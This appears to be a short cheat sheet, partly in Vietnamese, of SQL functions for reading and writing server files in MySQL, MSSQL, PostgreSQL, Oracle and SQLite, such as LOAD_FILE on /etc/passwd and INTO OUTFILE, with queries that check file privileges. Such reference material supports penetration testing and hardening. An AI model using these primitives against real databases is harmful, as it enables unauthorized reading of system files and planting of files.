# Contents
* [Read File](#read-file)
* [Write File](#write-file)

## Read File

| DBMS | Hàm / Primitive | Cách dùng |
|---|---|---|
| MySQL | `LOAD_FILE()` | `SELECT LOAD_FILE('/etc/passwd');` |
| MSSQL | `OPENROWSET(BULK ...)` | `SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;` |
| PostgreSQL | `pg_read_file()` | `SELECT pg_read_file('/etc/passwd', 0, 200);` |
| PostgreSQL | `pg_ls_dir()` | `SELECT pg_ls_dir('/tmp');` | 
| PostgreSQL | `COPY FROM` | `COPY temp FROM '/etc/passwd';` |
| PostgreSQL | `lo_import()` | `SELECT lo_import('/etc/passwd');` | 
| Oracle | `UTL_FILE.FOPEN` + `UTL_FILE.GET_LINE` | `SELECT utl_file.get_line(utl_file.fopen('DIR_OBJ','file.txt','R'), 32767) FROM dual;` |

---

## Write File

| DBMS | Hàm / Primitive | Cách dùng |
|---|---|---|
| MySQL | `INTO OUTFILE` | `SELECT 'test' INTO OUTFILE '/tmp/test.txt';` |
| PostgreSQL | `COPY TO` | `COPY (SELECT 'test') TO '/tmp/test.txt';` |
| Oracle | `UTL_FILE.PUT_LINE` | `BEGIN f := utl_file.fopen('DIR_OBJ','file.txt','W'); utl_file.put_line(f,'test'); utl_file.fclose(f); END;` |
| SQLite | `writefile()` | `SELECT writefile('/tmp/test.txt', 'data');` |

---

### Xem quyền / kiểm tra

#### MySQL

```sql
SHOW GRANTS FOR CURRENT_USER();
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT @@secure_file_priv;
```

#### MSSQL

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```

#### PostgreSQL

```sql
SELECT rolsuper, rolname
FROM pg_roles
WHERE rolname = current_user;

SELECT pg_has_role(current_user, 'pg_read_server_files', 'member');
```

#### Oracle

```sql
SELECT * FROM session_privs;
SELECT * FROM user_tab_privs WHERE table_name = 'UTL_FILE';
SELECT * FROM all_directories;
```

#### SQLite

```sql
PRAGMA compile_options;
```
